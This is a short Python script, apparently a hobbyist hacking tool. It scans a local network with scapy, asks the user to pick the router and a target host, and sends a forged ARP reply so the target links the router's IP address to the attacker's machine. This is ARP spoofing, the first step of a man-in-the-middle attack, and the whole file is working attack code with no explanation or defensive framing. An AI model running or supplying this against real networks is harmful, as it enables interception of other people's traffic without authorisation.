#!/usr/bin/env python
import scapy.all as scapy
import optparse


from scaner5 import ARP_scan, print_result


def argument():
    p = optparse.OptionParser()
    p.add_option("-i", "--ip-localhost", dest="ip_localhost", help="IP address localhost")
    p.add_option("-l", "--interface", dest="interface")
    #p.add_option("-r", "--ip-router", dest="ip_router", help="IP address router")
    #p.add_option("-u", "--ip-user", dest="ip_user", help="IP address user host")
    (options, arguments) = p.parse_args()
    if not options.ip_localhost and not options.interface:
        p.error()
    else:
        return options


a = argument()
f = ARP_scan(a.ip_localhost, 2)
print_result(f)
a = int(input("[+] Your use IP router and MAC address:"))
b = int(input("[+] Your use IP user and MAC address:"))
packet = scapy.ARP(op=2, pdst=f[b]["ip"], hwdst=f[b]["mac"], psrc=f[a]["ip"])
scapy.send(packet)